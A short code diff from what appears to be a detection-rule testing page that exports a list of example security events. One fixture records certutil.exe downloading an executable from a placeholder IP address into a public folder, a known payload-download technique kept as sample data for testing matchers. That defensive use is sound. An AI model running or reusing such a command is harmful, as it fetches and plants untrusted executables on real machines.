@@ -14,7 +14,7 @@ import { testRules, type RuleTestResult } from '@/lib/engine-writes'
 // The example EVENTS are product fixtures (they exercise the engine's
 // matchers); only the button label travels in the dictionary, bound to
 // the fixture by index (deep parity keeps the two lists aligned).
-const EXAMPLES: { event: Record<string, unknown> }[] = [
+export const EXAMPLES: { event: Record<string, unknown> }[] = [
   {
     event: { type: 'process.create', host: 'LAB-WKS-01', user: 'CORP\\ana', process: { pid: 4321, name: 'certutil.exe', command_line: 'certutil.exe -urlcache -split -f http://203.0.113.9/p.exe C:\\Users\\Public\\p.exe' } },
   },
